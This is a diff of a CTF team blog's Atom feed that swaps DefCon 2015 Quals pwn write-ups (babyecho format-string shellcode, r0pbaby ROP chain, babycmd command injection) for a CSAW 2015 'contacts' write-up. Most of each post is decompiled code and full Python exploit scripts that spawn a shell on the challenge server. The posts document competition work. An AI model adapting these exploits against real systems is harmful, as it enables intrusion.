@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Category: Pwn | GeeksSpeak Team Blog]]></title>
+  <title><![CDATA[Category: Pwn, | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/pwn/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-05-20T00:44:41+04:30</updated>
+  <updated>2015-09-21T17:50:10+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -14,381 +14,153 @@
 
   
   <entry>
-    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babyecho Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/"/>
-    <updated>2015-05-18T21:45:44+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup</id>
-    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycho Writeup</strong><br/>
-<strong>Point = 1</strong><br/>
-<strong>Category = Pwnable</strong></p>
+    <title type="html"><![CDATA[CSAW 2015 - PWN250 - Contacts]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/"/>
+    <updated>2015-09-21T17:43:52+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts</id>
+    <content type="html"><![CDATA[<p><strong>CSAW 2015 contacts Writeup</strong><br/>
+<strong>Point = 250</strong><br/>
+<strong>Category = Exploitable</strong></p>
 
-<blockquote><p>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d</p></blockquote>
+<p>Hi,</p>
 
-<pre><code>$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
-babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
-$ checksec.sh --file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
+<p>we are given a binary <code>contacts</code>,</p>
+
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file contacts
+contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped
 </code></pre>
 
-<p>First try got my attention:</p>
+<p>The binary seems to be a contact manager, based on my analysis it has a buffer at <code>BSS</code>, and every time we create a contact this structure will be located at the buffer:</p>
 
-<pre><code>$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
-Reading 13 bytes
-%p%p%p%p
-0xd0xa(nil)0xd
-Reading 13 bytes
+<pre><code>struct contact {
+    char *desc;
+    char *num;
+    char name[64];
+    unsigned int desc_length;
+    int enabled;
+};
 </code></pre>
 
-<p>There is format string vulnerability, and based on binary properties we should run our shellcode.</p>
+<p><code>desc</code> is the contacs description and allocates a buffer with buffer size <code>des_length</code>. <code>num</code> is the contact number with size <code>0xb</code>.</p>
 
-<!--more-->
+<p>So, we are going to find vulnerabilities.</p>
 
+<p>I named <code>0x08048980</code> => <code>editCon</code>, this function edites the contact which you give its name, let&rsquo;s check the decompilation:</p>
 
-<p>but there&rsquo;s a limit, 13 bytes? right?</p>
-
-<p>time to take a look at binary in IDA, the main function is <code>sub_8048F3C</code>.
-some resolving symbols the function looks like this:</p>
-
-<pre><code>int sub_8048F3C()
+<pre><code>int __cdecl editCon(int a1)
 {
-  signed int v0; // eax@2
-  int v3; // [sp+10h] [bp-410h]@1
-  int v4; // [sp+1Ch] [bp-404h]@4
-  int v5; // [sp+41Ch] [bp-4h]@1
+  int n; // [sp+1Ch] [bp-5Ch]@6
+  int v3; // [sp+20h] [bp-58h]@5
+  int v4; // [sp+24h] [bp-54h]@1
+  int v5; // [sp+28h] [bp-50h]@3
+  char s; // [sp+2Ch] [bp-4Ch]@1
+  int v7; // [sp+6Ch] [bp-Ch]@1
 
-  v5 = *MK_FP(__GS__, 20);
-  v3 = 13;
-  setvbuf((int)off_80EA4C0, 0, 2, 0);
-  signal(14, (int)sub_8048EB1);
-  alarm(10);
+  v7 = *MK_FP(__GS__, 20);
+  v4 = a1;
+  printf("Name to change? ");
+  fgets(&amp;s, 64, stdin);
+  if ( strchr(&amp;s, 10) )
+    *strchr(&amp;s, 10) = 0;
+  v5 = 0;
   while ( 1 )
   {
-    v0 = 1023;
-    if ( v3 &lt;= 1023 )
-      v0 = v3;
-    v3 = v0;
-    printf("Reading %d bytes\n", v0);
-    reado((int)&amp;v4, v3, 10);
-    filter_n((int)&amp;v4);
-    printf((const char *)&amp;v4);
-    alarm(10);
-  }
-}
-</code></pre>
-
-<p>the <code>filter_n</code> function just checks for <code>%n</code> and filters it as <code>_n</code>.</p>
-
-<p>if i overwrite <code>v0</code> i can send my shellcode and return to it.</p>
-
-<p>i just need to know the offset, and gdb says it is 7:</p>
-
-<pre><code>Reading 13 bytes
-%p%p%p%p
-[-------------------------------------registers--------------------------------------]
-EAX: 0xffffc86c ("%p%p%p%p")
-EBX: 0x80481a8 (push   ebx)
-ECX: 0x0 
-EDX: 0xffffffff 
-ESI: 0x0 
-EDI: 0x80ea00c --&gt; 0x80660a0 (mov    edx,DWORD PTR [esp+0x4])
-EBP: 0xffffcc78 --&gt; 0x80497d0 (push   ebx)
-ESP: 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
-EIP: 0x804900f (call   0x804f560)
-[----------------------------------------code----------------------------------------]
-   0x8049003:   call   0x8048ecf
-   0x8049008:   lea    eax,[esp+0x1c]
-   0x804900c:   mov    DWORD PTR [esp],eax
-=&gt; 0x804900f:   call   0x804f560
-   0x8049014:   mov    DWORD PTR [esp],0xa
-   0x804901b:   call   0x804fde0
-   0x8049020:   mov    DWORD PTR [esp],0x14
-   0x8049027:   call   0x806cb50
-Guessed arguments:
-arg[0]: 0xffffc86c ("%p%p%p%p")
-[---------------------------------------stack----------------------------------------]
-00:0000| esp 0xffffc850 --&gt; 0xffffc86c ("%p%p%p%p")
-01:0004|     0xffffc854 --&gt; 0xd (b'\r')
-02:0008|     0xffffc858 --&gt; 0xa (b'\n')
-03:0012|     0xffffc85c --&gt; 0x0 
-04:0016|     0xffffc860 --&gt; 0xd (b'\r')
-05:0020|     0xffffc864 --&gt; 0xffffc86c ("%p%p%p%p")
-06:0024|     0xffffc868 --&gt; 0x0 
-07:0028| eax 0xffffc86c ("%p%p%p%p")
-[------------------------------------------------------------------------------------]
-Legend: stack, code, data, heap, rodata, value
-
-Breakpoint 2, 0x0804900f in ?? ()
-</code></pre>
-
-<p>Obviously, first i should leak the stack address at offset 5, then overwrite the <code>v0</code> so i send my shellcode, but the main part is how to break the loop. for this i just overwrite return address of <code>printf</code> and then jump to my shellcode.</p>
-
-<p>TL;DR
-Please check my implementation:</p>
-
-<pre><code>#!/usr/bin/python
-
-import socket
-import struct
-import telnetlib
-
-def readuntil(f, delim='\n'):
-    data = ''
-    while not data.endswith(delim):
-        c = f.read(1)
-        assert len(c) &gt; 0
-        data += c
-    #print data
-    return data
-
-def p(v):
-    return struct.pack('&lt;I', v)
-
-def u(v):
-    return struct.unpack('&lt;I', v)[0]
-
-
-#s = socket.create_connection(("127.0.0.1", 1337))
-s = socket.create_connection(("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232))
-f = s.makefile('rw', bufsize=0)
-
-raw_input("$") # attach debugger
-
-
-shellcode = (
-"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
-          "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
-                  "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
-        )
-
-readuntil(f)
-f.write("%p"*5+"\n")
-loc =  int(readuntil(f)[:-1].split("0x")[-1], 16)  - 0x0c
-
-readuntil(f)
-f.write(p(loc)+"%30u%7$n\n")
-
-
-
-readuntil(f)
-f.write(p(loc)+"%1200u%7$n\n")
-
-readuntil(f)
-
-wrl = loc+100 &amp; 0xffff
-wrh = (loc+100 &gt;&gt; 16 ) &amp; 0xffff
-
-print hex(wrl), hex(wrh)
-
-payload = p(loc-0x14)+"%0{i}c".format(i=wrl)+"%0007$hn"+"%0{i}c".format(i=(wrh-wrl-8))+p(loc-0x12)+"%0014$hn"+p(loc-0x12)+"A"*48+shellcode+"A"*(1024 - 48 - len(shellcode))+"\n"
-print payload
-
-
-f.write(payload)
-
-print "[+] shell is ready: "
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-</code></pre>
-
-<p>there you go:</p>
-
-<pre><code>$ python babyecho-expl.py
-0x4a24 0xffd2
-�I��%018980c%0007$hn%046502c
-[...]
-cat /home/babyecho/flag 
-The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
-</code></pre>
-
-<p>@HAMIDx9</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DefConCTF 2015 Quals - ROPBaby Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/"/>
-    <updated>2015-05-18T21:16:42+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup</id>
-    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 ROPBaby Writeup</strong><br/>
-<strong>Point = 1</strong><br/>
-<strong>Category = Pwnable</strong></p>
-
-<p>As the challenge name proved we should use ROP technique to read flag from the server ( or pop a shell ).</p>
-
-<blockquote><p>r0pbaby_542ee6516410709a1421141501f03760</p></blockquote>
-
-<p>&#8220;`
-./r0pbaby_542ee6516410709a1421141501f03760</p>
-
-<!--more-->
-
-
-<dl>
-<dt>Welcome to an easy Return Oriented Programming challenge&hellip;</dt>
-<dt>Menu:</dt>
-<dt>1) Get libc address</dt>
-<dt>2) Get address of a libc function</dt>
-<dt>3) Nom nom r0p buffer to stack</dt>
-<dt>4) Exit</dt>
-<dd>1</dd>
-<dt>libc.so.6: 0x00007FF0352429B0</dt>
-<dt>1) Get libc address</dt>
-<dt>2) Get address of a libc function</dt>
-<dt>3) Nom nom r0p buffer to stack</dt>
-<dt>4) Exit</dt>
-<dd>2</dd>
-<dt>Enter symbol: system</dt>
-<dt>Symbol system: 0x00007FF034A9DC40</dt>
-<dt>1) Get libc address</dt>
-<dt>2) Get address of a libc function</dt>
-<dt>3) Nom nom r0p buffer to stack</dt>
-<dt>4) Exit</dt>
-<dd></dd>
-</dl>
-
-<pre><code>
-So we have address of any symbols of the `libc.so.6`.
-
-Let's check the binary in IDA, the main function is `sub_C46`.
-</code></pre>
-
-<p><strong>int64 sub_C46()
-{
-  </strong>int64 v0; // rax@2
-  signed int v1; // eax@4
-  <strong>int64 v2; // rax@12
-  unsigned </strong>int64 v3; // r14@15
-  int v4; // er13@17
-  size_t v5; // r12@17
-  int v6; // eax@18
-  void *handle; // [sp+8h] [bp-448h]@1
-  char nptr[1088]; // [sp+10h] [bp-440h]@2
-  __int64 savedregs; // [sp+450h] [bp+0h]@22</p>
-
-<p>  setvbuf(stdout, 0LL, 2, 0LL);
-  signal(14, handler);
-  puts(&ldquo;\nWelcome to an easy Return Oriented Programming challenge&hellip;&rdquo;);
-  puts(&ldquo;Menu:&rdquo;);
-  handle = dlopen(&ldquo;libc.so.6&rdquo;, 1);
-  while ( 1 )
-  {
-    while ( 1 )
+    if ( v5 &gt; 9 )
     {
-      while ( 1 )
-      {
-        while ( 1 )
-        {
-          sub_BF7();
-          LODWORD(v0) = sub_B9A(nptr, 1024LL);
-          if ( !v0 )
-          {
-            puts(&ldquo;Bad choice.&rdquo;);
-            return 0LL;
-          }
-          v1 = strtol(nptr, 0LL, 10);
-          if ( v1 != 2 )
-            break;
-          <strong>printf_chk(1LL, &ldquo;Enter symbol: &rdquo;);
-          LODWORD(v2) = sub_B9A(nptr, 64LL);
-          if ( v2 )
-          {
-            dlsym(handle, nptr);
-            </strong>printf_chk(1LL, &ldquo;Symbol %s: 0x%016llX\n&rdquo;);
-          }
-          else
-          {
-            puts(&ldquo;Bad symbol.&rdquo;);
-          }
-        }
-        if ( v1 > 2 )
-          break;
-        if ( v1 != 1 )
-          goto LABEL_24;
-        <strong>printf_chk(1LL, &ldquo;libc.so.6: 0x%016llX\n&rdquo;);
-      }
-      if ( v1 != 3 )
-        break;
-      </strong>printf_chk(1LL, &ldquo;Enter bytes to send (max 1024): &rdquo;);
-      sub_B9A(nptr, 1024LL);
-      v3 = (signed int)strtol(nptr, 0LL, 10);
-      if ( v3 - 1 > 0x3FF )
-      {
-        puts(&ldquo;Invalid amount.&rdquo;);
-      }
-      else
-      {
-        if ( v3 )
-        {
-          v4 = 0;
-          v5 = 0LL;
-          while ( 1 )
-          {
-            v6 = _IO_getc(stdin);
-            if ( v6 == -1 )
-              break;
-            nptr[v5] = v6;
-            ++v4;
-            v5 = v4;
-            if ( v3 &lt;= v4 )
-              goto LABEL_22;
-          }
-          v5 = v4 + 1;
-        }
-        else
-        {
-          v5 = 0LL;
-        }
-LABEL_22:
-        memcpy(&amp;savedregs, nptr, v5);
-      }
+      puts("Name not found");
+      return *MK_FP(__GS__, 20) ^ v7;
     }
-    if ( v1 == 4 )
+    if ( !strcmp(&amp;s, (v4 + 8)) )
       break;
-LABEL_24:
-    puts(&ldquo;Bad choice.&rdquo;);
+    ++v5;
+    v4 += 80;
   }
-  dlclose(handle);
-  puts(&ldquo;Exiting.&rdquo;);
-  return 0LL;
+  printf("1.Change name\n2.Change description\n&gt;&gt;&gt; ");
+  __isoc99_scanf("%u%*c", &amp;v3);
+  if ( v3 == 1 )
+  {
+    printf("New name: ");
+    fgets((v4 + 8), n, stdin);
+    if ( strchr((v4 + 8), 10) )
+      *strchr((v4 + 8), 10) = 0;
+  }
+  else if ( v3 == 2 )
+  {
+    free(*v4);
+    printf("Length of description: ");
+    __isoc99_scanf("%u%*c", &amp;n);
+    printf("Description: \n\t");
+    *v4 = malloc(n);
+    fgets(*v4, n, stdin);
+  }
+  else
+  {
+    puts("Bad option");
+  }
+  return *MK_FP(__GS__, 20) ^ v7;
+</code></pre>
+
+<p>As you may noticed when i try to edit the name there is no input length check a buffer overflow vulnerability. but there may be a problem since we don&rsquo;t know it&rsquo;s value <code>n</code>.
+this can be fixed by first preparing a description edit, so after entering the function again we have a known size.</p>
+
+<p>and after some diging we can notice there is an another vulnerability,  <code>0x08048bd1</code> => pCon:</p>
+
+<pre><code>int __cdecl pCon(int a1, int a2, int a3, char *format)
+{
+  printf("\tName: %s\n", a1);
+  printf("\tLength %u\n", a2);
+  printf("\tPhone #: %s\n", a3);
+  printf("\tDescription: ");
+  return printf(format);
 }
-&#8220;`</p>
-
-<p>After resolving symbols we can use third menu to overflow and execute our chain.</p>
-
-<pre><code>$ file ./r0pbaby_542ee6516410709a1421141501f03760
-./r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
-$ checksec.sh --file ./r0pbaby_542ee6516410709a1421141501f03760
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./r0pbaby_542ee6516410709a1421141501f03760
 </code></pre>
 
-<p>but there may be a problem since we don&rsquo;t have the <code>libc.so.6</code>. but we have, don&rsquo;t we? :)
-i used the libc&rsquo;s version of the <code>babycmd</code> challenge.</p>
+<p>Here we go, a nice format string vulnerability.</p>
 
-<pre><code>./lib/x86_64-linux-gnu/libc.so.6 
-GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release version 2.19, by Roland McGrath et al.
-Copyright (C) 2014 Free Software Foundation, Inc.
-</code></pre>
+<p>by using these two vulnerabilites we have write-what-where primitive to exploit the binary.</p>
 
-<p>so you can find it here: [<a href="http://packages.ubuntu.com/trusty/libc6">http://packages.ubuntu.com/trusty/libc6</a>]</p>
+<p>this is my scenario,</p>
 
-<p>** note: just use LD_LIBRARY_PATH to use this version to implement the attack completely.</p>
+<ol>
+<li>create a contact.</li>
+<li>leak a pointer to locate the <code>system</code> symbol using fmt vuln.</li>
+<li>create second contact.</li>
+<li>leak second contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>create third contact.</li>
+<li>leak third contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>Overflow first contact name into the second and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free</code> got address.</li>
+<li>Overflow second contact name into the third and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free+2</code> got address.</li>
+<li>Edit second and third contacts description to <code>%####x%1$hn</code> and proper number to overwrite <code>free</code> to <code>system</code></li>
+<li>Edit first contact description to &lsquo;/bin/sh\x00&rsquo;</li>
+<li>delete first contact and pop a shell.</li>
+</ol>
 
-<p>Then i found the offset of <code>/bin/sh</code> and <code>pop rdi; ret</code> from the <code>system</code> symbols of the our given <code>libc.so.6</code> as you can see below:<br/>
-  * /bin/sh offset from system: +0x13669b<br/>
-  * pop rdi; ret offset from system: -0x23b26</p>
 
-<p>you can see my implementation here:</p>
+<p>Of course null byte is not our concern since fgets is used in reading procedure.</p>
+
+<p><strong> please notice i used <code>precision</code> task libc version </strong> but you can use libc_database to find a proper one blindly.</p>
+
+<p>I should declare there maybe another or better solution but this let me in ;)</p>
+
+<p>and finally out exploit:</p>
 
 <pre><code>#!/usr/bin/python
 
-import socket
-import struct
-import telnetlib
 
-def readuntil(f, delim=': '):
+import telnetlib
+import struct
+import socket
+import re
+import time
+from hexdump import hexdump
+import pdb
+
+#system_offset = 0x22a32 # local - ubuntu 15.04 - libc6-2.21-0ubuntu4
+system_offset = 0x2670d # Remote -  ubuntu 14.04.2 - libc6_2.19-0ubuntu6.
+
+def readuntil(f, delim='&gt;&gt;&gt; '):
     data = ''
     while not data.endswith(delim):
         c = f.read(1)
@@ -404,313 +176,137 @@ def u(v):
     return struct.unpack('&lt;Q', v)[0]
 
 
-#s = socket.create_connection(("127.0.0.1", 1337))
-s = socket.create_connection(("r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me", 10436))
+
+def create_c(f, n, num, l, desc):
+    print "[+] Create Contact"
+    f.write("1\n")
+    readuntil(f, 'Name: ')
+    f.write(n+"\n")
+    readuntil(f, ' No: ')
+    f.write(num+"\n")
+    readuntil(f, 'of description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Enter description:\n\t\t')
+    f.write(desc+"\n")
+    #print "MM", f.read(1024)
+    readuntil(f)
+
+
+def edit_con_nameon_desc(f, n, l, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("2\n")
+    readuntil(f, 'description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Description: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def edit_con_name(f, n, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("1\n")
+    readuntil(f, 'name: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def print_c(f):
+    print "[+] Print Contact"
+    f.write("4\n")
+    return readuntil(f)
+
+def delete_c(f, n):
+    print "[+] Delete Contact"
+    f.write("2\n")
+    readuntil(f, 'remove? ')
+    f.write(n+"\n")
+
+s = socket.socket()
+
+#s.connect(("54.165.223.128", 2555))
+s.connect(("127.0.0.1", 1337))
+
 f = s.makefile('rw', bufsize=0)
 
-raw_input("$") # attach debugger
+readuntil(f)
 
-print s.recv(1024)
-f.write("1\n")
-readuntil(f, "0x")
-a = f.read(16)
-print a
-libc = int(a, 16)
+raw_input("$")
 
-f.write("2\nsystem\n")
-readuntil(f, "0x")
-system = int(f.read(16), 16)
-print hex(system)
+#pdb.set_trace()
+create_c(f, "AA", "123123", 200, "%31$p\n")
+pr = print_c(f)
+address = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(address)
+system_offset += address
+print "[+] system address = ", hex(system_offset)
+edit_con_nameon_desc(f, "AA", 200, "/bin/sh\x00")
+create_c(f, "BB", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr)
+heap_addr += 0x10
 
-f.write("3\n32\n"+"A"*8+p(system-0x23b26)+p(system+0x13669b)+p(system)+"\n")
+edit_con_nameon_desc(f, "BB", 200, "BBB")
 
-print "[+] shell is ready: "
+create_c(f, "CC", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr_c = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr_c)
+heap_addr_c += 0x10
+
+edit_con_nameon_desc(f, "CC", 200, "CCC")
+
+edit_con_name(f, "AA", "AA\x00"+"A"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr) + struct.pack("&lt;I", 0x0804b014) + "BB\x00\n")
+
+edit_con_name(f, "BB", "BB\x00"+"B"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr_c) + struct.pack("&lt;I", 0x0804b016) + "CC\x00\n")
+
+
+edit_con_nameon_desc(f, "BB", 200, "%{}x%1$hn".format(system_offset &amp; 0xffff))
+edit_con_nameon_desc(f, "CC", 200, "%{}x%1$hn".format((system_offset &gt;&gt; 16) &amp; 0xffff))
+print_c(f)
+
+delete_c(f, "AA")
+
 t = telnetlib.Telnet()
 t.sock = s
 t.interact()
+
+
+s.close()
 </code></pre>
 
-<p>and launching the attack:</p>
+<p>And running the expl:</p>
 
-<pre><code>$ python r0pbaby-expl.py 
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ python sol.py 
 $
-
-Welcome to an easy Return Oriented Programming challenge...
-Menu:
-1) Get libc address
-2) Get address of a libc function
-3) Nom nom r0p buffer to stack
-4) Exit
-: 
-00007F9F01F43AB0
-0x7f9f0179f640
-[+] shell is ready: 
-
-1) Get libc address
-2) Get address of a libc function
-3) Nom nom r0p buffer to stack
-4) Exit
-: Enter bytes to send (max 1024): 1) Get libc address
-2) Get address of a libc function
-3) Nom nom r0p buffer to stack
-4) Exit
-: Bad choice.
-ls
-bin
-boot
-[..]
-cat /home/r0pbaby/flag
-The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?
+[+] Create Contact
+[+] Print Contact
+[+] address =  0xf75a9a83
+[+] system address =  0xf75d0190
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea10e8
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea11c8
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Print Contact
+[+] Delete Contact
+cat flag
+flag{f0rm47_s7r1ng5_4r3_fun_57uff}
 </code></pre>
-
-<p>And another 1 point. Thanks #defconctf</p>
-
-<p>@HAMIDx9</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babycmd Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/"/>
-    <updated>2015-05-18T13:39:52+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup</id>
-    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycmd Writeup</strong><br/>
-<strong>Point = 1</strong><br/>
-<strong>Category = Pwnable</strong></p>
-
-<p>As you may now defconctf started 2 days ago, so we participated and you can check our solutions right here.</p>
-
-<p>OK, So there was 4 problem categories: <code>Baby's first</code>,  <code>Pwning</code>, <code>Coding</code>, <code>Reverse</code> and <code>Misc</code>.</p>
-
-<p>This is babycmd writeup as you can see below,</p>
-
-<p>&ndash;</p>
-
-<p>There was a binary <code>babycmd_3ad28b10e8ab283d7df81795075f600b</code> by following properties:</p>
-
-<pre><code>$ file babycmd_3ad28b10e8ab283d7df81795075f600b
-babycmd_3ad28b10e8ab283d7df81795075f600b: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
-$ checksec.sh --file babycmd_3ad28b10e8ab283d7df81795075f600b 
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babycmd_3ad28b10e8ab283d7df81795075f600b
-</code></pre>
-
-<p>This is so much for 1 point task, but you know this is DEFCON.</p>
-
-<!--more-->
-
-
-<p>by running the binary, it was a wrapper providing 3 functionalites: <code>ping</code>, <code>host</code>, <code>dig</code></p>
-
-<pre><code>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
-
-Welcome to another Baby's First Challenge!
-Commands: ping, dig, host, exit
-: ping 8.8.8.8
-PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
-
---- 8.8.8.8 ping statistics ---
-3 packets transmitted, 0 received, 100 0x56191abe7100acket loss, time 2016ms          
-
-Commands: ping, dig, host, exit                                                       
-: host hamidx9.ir
-hamidx9.ir has address 104.28.29.35
-hamidx9.ir has address 104.28.28.35
-hamidx9.ir has IPv6 address 2400:cb00:2048:1::681c:1c23
-Commands: ping, dig, host, exit
-: 
-</code></pre>
-
-<p>as strace says, it seems it parses the input and filter it and then try to execute!</p>
-
-<p>Basicly with <code>executing</code> word i always look for a filter bypass and execute arbitrary commands. but <code>0x56191abe7100acket</code> in the ping command got my attention.</p>
-
-<p>It&rsquo;s time to open the binary in IDA:</p>
-
-<ol>
-<li><p>6 main functions:<br/>
-<code>sub_F5C</code>: parse and execute dig<br/>
-<code>sub_10BD</code>: parse and execute host<br/>
-<code>sub_E35</code>: parse and execute ping<br/>
-<code>sub_121E</code>: main()<br/>
-<code>sub_D65</code>: parse the input<br/>
-<code>sub_DCC</code>: filter the input</p></li>
-<li><p><code>ping</code> does not seem to be vulnerable:
-<code>
- if ( (unsigned int)sub_D65(a1, (__int64)&amp;cp) )
- {
-   if ( inet_aton(&amp;cp, &amp;v4) )
-   {
-     v1 = inet_ntoa(v4);
-     __sprintf_chk(&amp;command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
-     v2 = popen(&amp;command, "r");
-     if ( v2 )
-     {
-       while ( fgets(&amp;s, 512, v2) )
-         __printf_chk(1LL, &amp;s);
-       pclose(v2);
-     }
-</code>
-the <code>v1</code>  param which passes to <code>sprintf</code> returning from <code>inet_ntoa</code> so it cannot be a arbitrary value.</p></li>
-<li><p>let&rsquo;s look at host code:</p></li>
-</ol>
-
-
-<pre><code>__int64 __fastcall sub_10BD(__int64 a1)
-{
-  char *v1; // rax@6
-  FILE *v2; // rbp@10
-  struct in_addr v4; // [sp+0h] [bp-538h]@5
-  char command; // [sp+10h] [bp-528h]@6
-  char cp; // [sp+190h] [bp-3A8h]@3
-  char s; // [sp+310h] [bp-228h]@12
-  __int64 v8; // [sp+518h] [bp-20h]@1
-
-  v8 = *MK_FP(__FS__, 40LL);
-  if ( a1 )
-  {
-    if ( (unsigned int)sub_D65(a1, (__int64)&amp;cp) )
-    {
-      if ( inet_aton(&amp;cp, &amp;v4) )
-      {
-        v1 = inet_ntoa(v4);
-        __sprintf_chk(&amp;command, 1LL, 384LL, "host %s", v1);
-      }
-      else
-      {
-        if ( !(unsigned int)sub_DCC((__int64)&amp;cp) )
-        {
-          puts("Invalid hostname.");
-          return *MK_FP(__FS__, 40LL) ^ v8;
-        }
-        __sprintf_chk(&amp;command, 1LL, 384LL, "host \"%s\"", &amp;cp);
-      }
-      v2 = popen(&amp;command, "r");
-      if ( v2 )
-      {
-        while ( fgets(&amp;s, 512, v2) )
-          __printf_chk(1LL, &amp;s);
-        pclose(v2);
-      }
-      else
-      {
-        puts("Command failed.");
-      }
-    }
-    else
-    {
-      puts("Invalid Host or IP address sent to dig.");
-    }
-  }
-  else
-  {
-    puts("No address specified.");
-  }
-  return *MK_FP(__FS__, 40LL) ^ v8;
-}
-</code></pre>
-
-<p>As you can see, second <code>__sprintf_chk</code> may acts unexpectedly. but there could be problem in using <code>sub_DCC</code>.</p>
-
-<ol>
-<li><code>sub_DCC</code> code:</li>
-</ol>
-
-
-<pre><code>signed __int64 __fastcall sub_DCC(__int64 a1)
-{
-  __int64 v1; // rsi@1
-  signed __int64 v2; // rcx@1
-  bool v3; // zf@3
-  signed __int64 v4; // rcx@4
-  signed __int64 result; // rax@4
-  char v6; // dl@7
-
-  v1 = a1;
-  v2 = -1LL;
-  do
-  {
-    if ( !v2 )
-      break;
-    v3 = *(_BYTE *)a1++ == 0;
-    --v2;
-  }
-  while ( !v3 );
-  v4 = ~v2;
-  result = 0LL;
-  if ( (unsigned __int64)(v4 - 4) &lt;= 0x3C )
-  {
